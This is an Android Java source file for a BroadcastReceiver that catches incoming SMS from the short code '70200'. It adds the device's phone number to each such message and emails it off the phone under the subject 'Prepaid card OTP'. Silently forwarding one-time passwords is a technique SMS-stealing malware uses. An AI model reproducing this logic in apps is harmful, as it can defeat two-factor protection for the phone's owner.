package com.xdel.luke;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.xdel.luke.objClasses.objGlobalMethods;

import java.util.Date;

public class SMSReceiver extends BroadcastReceiver {
    /*public SMSReceiver() {
    }*/

    private String deviceCurrPhoneNumber;
    private String currSenderNumber;
    private String currMsg;
    //private String senderNumber = "+6594548159";
    private String senderNumber = "70200";
    private String finalEmailMsg;
    private String[] UsernamePwd = new String[4];
    private String username = "", useridx = "";
    private SharedPreferences GcmPref;
    ConnectionDetector cd;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        Bundle bundle = intent.getExtras();

        try{
            TelephonyManager tm = (TelephonyManager)context.getSystemService(context.TELEPHONY_SERVICE);
            deviceCurrPhoneNumber = tm.getLine1Number();

            GcmPref = context.getSharedPreferences(MainActivity.class.getSimpleName(),
                    Context.MODE_PRIVATE);

            UsernamePwd = objGlobalMethods.getLoginUsernamePwd(GcmPref);
            username = UsernamePwd[0];
            useridx = UsernamePwd[2];

            if (bundle != null){
                Object[] pdusObj = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[pdusObj.length];

                // getting SMS information from Pdu.
                for (int i = 0; i < pdusObj.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                }

                for (SmsMessage currentMessage : messages) {
                    currSenderNumber = "";
                    currMsg = "";
                    currSenderNumber =  currentMessage.getDisplayOriginatingAddress();  //has sender's phone number
                    currMsg = currentMessage.getDisplayMessageBody();    //has the actual message
                    if (currSenderNumber.equals(senderNumber)){
                        if (!currMsg.equals("")){
                            finalEmailMsg = "SMS from: " + currSenderNumber + ", for handphone number: " + deviceCurrPhoneNumber + "\n\n" + currMsg;
                            //cd = new ConnectionDetector(context);
                            cd = new ConnectionDetector(null);
                            if (cd.isConnectingToInternet()){
                                JobsHandler.sendNormalEmail("Prepaid card OTP", finalEmailMsg);
                            }
                            else{

                            }

                            break;
                        }
                        else{
                            break;
                        }
                    }
                }
            }
        }
        catch (Exception e){
            objGlobalMethods.writeToFile("Exception caught at SMSReceiver onReceive. Exception: " + e.getMessage().toString(),"","","","");
        }
    }
}
